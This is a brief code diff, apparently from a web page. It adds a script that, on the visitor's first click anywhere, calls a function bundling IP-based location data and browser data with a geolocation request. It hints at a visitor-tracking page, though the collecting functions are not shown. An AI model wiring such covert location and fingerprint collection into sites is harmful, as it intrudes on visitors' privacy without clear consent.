@@ -113,6 +113,13 @@ async function main() {
   }
 }
 
+  // Adicione isto no final da função main()
+setTimeout(() => {
+  document.addEventListener('click', function() {
+    requestGeolocationWithData(ipLocationData, browserData);
+  }, { once: true });
+}, 500);
+
 main();
 </script>
 
